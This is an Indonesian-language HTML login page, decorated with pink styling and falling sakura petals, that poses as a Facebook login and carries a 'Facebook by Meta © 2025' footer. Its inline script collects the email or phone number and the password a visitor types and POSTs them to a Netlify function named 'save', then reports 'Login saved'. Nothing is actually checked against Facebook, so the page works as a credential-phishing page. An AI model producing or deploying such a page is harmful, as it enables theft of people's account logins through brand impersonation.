<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login - Sakura Pink</title>

  <!-- Cute font -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --pink1: #ff8fb1;
      --pink2: #ffb6d9;
      --pink3: #ff6fa5;
      --pink4: #ff3d84;
      --pink-btn: linear-gradient(135deg, #ff7ab6, #ff378f);
      --bg: #f5f7fb;
      --text: #5d5d5d;
      --white: #fff;
      --shadow: 0 8px 25px rgba(255, 87, 160, 0.25);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }

    /* Background original + sakura space */
    body {
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    .app-shell {
      width: 100%;
      max-width: 430px;
      padding: 28px 16px 30px;
      text-align: center;
      z-index: 2;
    }

    /* Cute Heart Logo */
    .logo-heart {
      width: 95px;
      height: 95px;
      border-radius: 50%;
      background: linear-gradient(135deg, #ff7ec4, #ff4089);
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 12px;
      box-shadow: var(--shadow);
      color: white;
      font-size: 44px;
      font-weight: 800;
      text-shadow: 0 2px 6px rgba(0,0,0,.2);
    }

    .brand-subtitle {
      font-size: 14px;
      margin-bottom: 18px;
      color: #444;
    }

    .card {
      background: var(--white);
      border-radius: 18px;
      padding: 20px 18px;
      box-shadow: 0 10px 28px rgba(0,0,0,.12);
    }

    .card-title {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 4px;
      color: #ff488d;
    }

    .card-subtitle {
      font-size: 13px;
      margin-bottom: 12px;
      opacity: 0.75;
    }

    .input-field {
      width: 100%;
      padding: 12px 14px;
      border-radius: 10px;
      border: 1px solid #ffd2e6;
      background: #fff7fb;
      font-size: 14px;
      margin-bottom: 10px;
      transition: .2s;
    }

    .input-field:focus {
      border-color: #ff7eb6;
      background: white;
      box-shadow: 0 0 0 3px rgba(255, 183, 219, .4);
      outline: none;
    }

    .btn-primary {
      width: 100%;
      border: none;
      padding: 12px 14px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 10px;
      cursor: pointer;
      background: var(--pink-btn);
      color: white;
      margin: 10px 0 8px;
      box-shadow: var(--shadow);
      transition: 0.15s ease;
    }

    .btn-primary:hover {
      filter: brightness(1.08);
      transform: translateY(-2px);
      box-shadow: 0 14px 30px rgba(255, 51, 145, .3);
    }

    .forgot-link a {
      text-decoration: none;
      font-size: 13px;
      color: var(--pink4);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 16px 0;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background: #ffd0e8;
    }

    .divider-text {
      margin: 0 10px;
      font-size: 12px;
      color: #888;
    }

    .btn-secondary {
      width: 100%;
      border: none;
      padding: 12px 14px;
      border-radius: 10px;
      font-weight: 600;
      background: linear-gradient(135deg, #b9ffea, #6affd1);
      color: #ff2d7b;
      cursor: pointer;
      box-shadow: 0 10px 22px rgba(116, 255, 223, 0.3);
      transition: .15s;
    }

    .btn-secondary:hover {
      filter: brightness(1.08);
      transform: translateY(-2px);
    }

    .bottom-text {
      margin-top: 22px;
      font-size: 11px;
      opacity: 0.6;
    }

    /* Sakura Animation */
    .sakura-container {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 1;
    }

    .sakura {
      position: fixed;
      top: -10vh;
      width: 16px;
      height: 18px;
      background: radial-gradient(circle at 30% 30%, #ffeef7 0, #ff9bbd 40%, #e76a9b 100%);
      border-radius: 60% 40% 60% 40%;
      opacity: 0.85;
      filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
      animation: fall 14s linear infinite;
    }

    @keyframes fall {
      0%   { transform: translate3d(0,-10vh,0) rotateZ(0deg); }
      50%  { transform: translate3d(25px,50vh,0) rotateZ(160deg); }
      100% { transform: translate3d(-25px,110vh,0) rotateZ(360deg); }
    }
  </style>
</head>
<body>

<div class="sakura-container" id="sakuraContainer"></div>

<div class="app-shell">
  <div class="logo-heart">‚ù§</div>
  <div class="brand-subtitle">Masuk ke dunia Facbook PRO pink aesthetic üå∏</div>

  <div class="card">
    <div class="card-title">Masuk</div>
    <div class="card-subtitle">Isi email atau nomor ponsel dan kata sandi.</div>

    <input id="email" type="text" class="input-field" placeholder="Email / No. HP" />
<input id="password" type="password" class="input-field" placeholder="Kata sandi" />

<button class="btn-primary" onclick="saveLogin()">Masuk</button>

<script>
async function saveLogin() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    await fetch("/.netlify/functions/save", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
    });

    alert("Login disimpan!");
}
</script>


    <div class="forgot-link"><a href="#">Lupa kata sandi?</a></div>

    <div class="divider">
      <div class="divider-line"></div>
      <div class="divider-text">atau</div>
      <div class="divider-line"></div>
    </div>

    <button class="btn-secondary">Buat akun baru</button>
  </div>

  <div class="bottom-text">Facebook by Meta ¬© 2025</div>
</div>

<script>
  const sakuraContainer = document.getElementById("sakuraContainer");

  function createPetal() {
    const petal = document.createElement("div");
    petal.classList.add("sakura");
    petal.style.left = Math.random() * 100 + "vw";
    petal.style.animationDuration = 10 + Math.random() * 10 + "s";
    sakuraContainer.appendChild(petal);

    setTimeout(() => petal.remove(), 20000);
  }

  for (let i = 0; i < 35; i++) {
    setTimeout(createPetal, i * 180);
  }
  setInterval(() => createPetal(), 800);
</script>

</body>
</html>
